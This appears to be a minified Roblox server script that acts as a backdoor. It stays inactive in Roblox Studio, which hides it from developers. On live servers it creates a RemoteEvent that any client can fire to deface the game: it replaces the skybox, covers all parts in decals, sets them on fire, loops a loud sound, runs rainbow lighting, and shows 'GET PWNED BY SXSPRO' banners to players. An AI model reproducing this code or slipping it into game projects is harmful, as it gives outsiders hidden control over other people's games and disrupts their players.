if not game:GetService('RunService'):IsStudio() then local R, W, L, P = game:GetService('ReplicatedStorage'), game:GetService('Workspace'), game:GetService('Lighting'), game:GetService('Players'); local function createRemoteEvent(name) local e = Instance.new('RemoteEvent', R) e.Name = name return e end; local universalEvent = createRemoteEvent("UniversalEvent"); universalEvent.OnServerEvent:Connect(function(player, eventType) if eventType == "culEvent5" then local e = Instance.new("ColorCorrectionEffect", L) local f = function(X) return math.acos(math.cos(X * math.pi)) / math.pi end local g = 0 L.TimeOfDay = "15:00" while wait(0.01) do e.TintColor = Color3.fromHSV(f(g), 1, 1) L.Ambient = Color3.fromHSV(f(g), 1, 1) g = g + 0.01 end elseif eventType == "culEvent6" then local p = Instance.new('Part', W) local m = Instance.new('SpecialMesh', p) m.MeshId = 'rbxassetid://9894082653' m.TextureId = 'rbxassetid://9894082686' m.Scale = Vector3.new(11, 12, 10) p.Size = Vector3.new(4, 1, 2) p.Position = Vector3.new(math.random(-350, 350), 350, math.random(-350, 350)) p.Anchored = false p.CanCollide = false task.delay(0.1, function() end) task.delay(6, function() p:Destroy() end) elseif eventType == "culEvent2" then for _, i in ipairs(W:GetDescendants()) do if i:IsA('BasePart') then for _, j in ipairs(Enum.NormalId:GetEnumItems()) do local k = Instance.new('Decal') k.Parent = i k.Texture = 'http://www.roblox.com/asset/?id=10560525674' k.Face = j end end end elseif eventType == "culEvent" then local l = Instance.new('Sky', L) local m = 'http://www.roblox.com/asset/?id=10560525674' for _, n in ipairs({'SkyboxBk', 'SkyboxDn', 'SkyboxFt', 'SkyboxLf', 'SkyboxRt', 'SkyboxUp'}) do l[n] = m end elseif eventType == "culEvent3" then for _, o in pairs(W:GetDescendants()) do if o:IsA('BasePart') then local p = Instance.new('Fire') p.Parent = o end end elseif eventType == 'culEvent8' then local wt9 = Instance.new('Sound', W) wt9.SoundId = 'rbxassetid://15689450026' wt9.Volume = 5 wt9.Looped = true wt9:Play() wt9.Playing = true elseif eventType == 'culEvent9' then local b = Instance.new('BillboardGui') for _, v in pairs(P:GetPlayers()) do local head = v.Character:FindFirstChild('Head') if head then b.Parent = head b.Size = UDim2.new(10, 0, 10, 0) b.StudsOffset = Vector3.new(0, 5, 0) local t = Instance.new('TextLabel') t.Text = 'GET PWNED BY SXSPRO AKA SYSPRO TEAM ' t.TextScaled = true t.Parent = b t.BackgroundTransparency = 1 t.Size = UDim2.new(0, 199,0, 200) t.TextColor3 = Color3.new(1, 0, 0) t.Position = Vector3.new(0, 199,0, 200) end end elseif eventType == "culEvent4" then local q = Instance.new('Hint', W) q.Text = 'GET PWNED BY SXSPRO AKA SYSPRO TEAM (Special Thanks to lalol hub, v3rm(Group Id: 35298673))' end end) end

